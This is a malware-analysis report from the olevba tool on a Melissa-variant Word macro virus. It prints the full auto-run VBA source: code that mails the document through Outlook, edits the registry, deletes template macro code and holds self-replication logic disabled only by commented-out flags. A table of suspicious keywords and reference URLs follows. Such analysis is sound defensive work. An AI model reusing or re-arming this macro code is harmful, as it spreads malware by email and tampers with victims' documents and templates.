olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.b-ebd7d4d5c48e8433c571e26386f8b221dd462e96
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MelissasLittleSister.cls 
in file: Virus.MSWord.Melissa.b-ebd7d4d5c48e8433c571e26386f8b221dd462e96 - OLE stream: 'Macros/VBA/MelissasLittleSister'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
'CommandBars("Macro").Controls("Security...").Enabled = False
'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
'Else
'CommandBars("Tools").Controls("Macro").Enabled = False
'Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
'End If
' This could have disabled your macro protection, but that code has been removed
Dim outlook1, outlook2, outlook3
Set outlook1 = CreateObject("Outlook.Application")
Set outlook2 = outlook1.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissasLittleSister?") <> "... by Kwyjibo" Then
If outlook1 = "Outlook" Then
outlook2.Logon "profile", "password"
    For List = 1 To outlook2.AddressLists.Count
        Set AddyBook = outlook2.AddressLists(y)
        currentnum = 1
        Set outlook3 = outlook1.CreateItem(0)
        For counter1 = 1 To AddyBook.AddressEntries.Count
            Peep = Application.UserName
            outlook3.Recipients.Add Peep
            currentnum = currentnum + 1
            If currentnum > 1 Then counter1 = AddyBook.AddressEntries.Count
         Next counter1
         outlook3.Subject = "Trust No One"
         outlook3.Body = "Be careful what you open.  It could be a virus."
         outlook3.Attachments.Add ActiveDocument.FullName
         outlook3.Send
         Peep = ""
    Next List
outlook2.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissasLittleSister?") = "... by DumbAss"
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "MelissasLittleSister" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "MelissasLittleSister"
' We don't want to actually infect the PC, just warn them
'DoAD = True
End If
If NTI1.Name <> "MelissasLittleSister" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "MelissasLittleSister"
' We don't want to actually infect the PC, just warn them
'DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
'WORD/MelissasLittleSister written by DumbAss
'Works in both Word 2000 and Word 97
'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!
Selection.TypeText "This could have had disasterous results.  Be more careful next tiem you open an e-mail.  Protect yourself!  Find out how at these web sites: "
Selection.TypeText " http://www.eos.ncsu.edu/eos/info/computer_ethics/www/abuse/wvt/worm/ "
Selection.TypeText " http://www.nipc.gov/nipc/w97melissa.htm "
Selection.TypeText " http://www.cert.org/advisories/CA-99-04-Melissa-Macro-Virus.html "
Selection.TypeText " http://www.microsoft.com/security/bulletins/ms99-002.asp "
Selection.TypeText " http://www.infoworld.com/cgi-bin/displayStory.pl?990326.wcvirus.htm "
Selection.TypeText "                  "
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.eos.ncsu.|URL                                          |
|          |edu/eos/info/compute|                                             |
|          |r_ethics/www/abuse/w|                                             |
|          |vt/worm/            |                                             |
|IOC       |http://www.nipc.gov/|URL                                          |
|          |nipc/w97melissa.htm |                                             |
|IOC       |http://www.cert.org/|URL                                          |
|          |advisories/CA-99-04-|                                             |
|          |Melissa-Macro-      |                                             |
|          |Virus.html          |                                             |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/security/bullet|                                             |
|          |ins/ms99-002.asp    |                                             |
|IOC       |http://www.infoworld|URL                                          |
|          |.com/cgi-bin/display|                                             |
|          |Story.pl?990326.wcvi|                                             |
|          |rus.htm             |                                             |
+----------+--------------------+---------------------------------------------+

